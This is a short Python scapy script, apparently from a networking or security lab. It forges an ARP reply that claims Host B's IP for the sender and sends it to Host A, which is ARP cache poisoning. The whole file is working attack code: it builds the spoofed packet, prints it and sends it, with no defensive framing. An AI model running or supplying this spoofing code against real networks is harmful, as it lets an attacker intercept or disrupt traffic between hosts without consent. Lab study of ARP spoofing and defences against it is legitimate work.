from scapy.all import * 
from Hosts import IP_Host_B, IP_Host_A, Mac_Host_A

def arp_reply(src, pdst, hw_dst):
    E = Ether()
    A = ARP()
    A.op = 2
    A.pdst = pdst
    A.psrc = src
    A.hwdst = hw_dst
    pkt = E/A
    return pkt


pkt = arp_reply(IP_Host_B, IP_Host_A, Mac_Host_A)
pkt.show()
sendp(pkt)
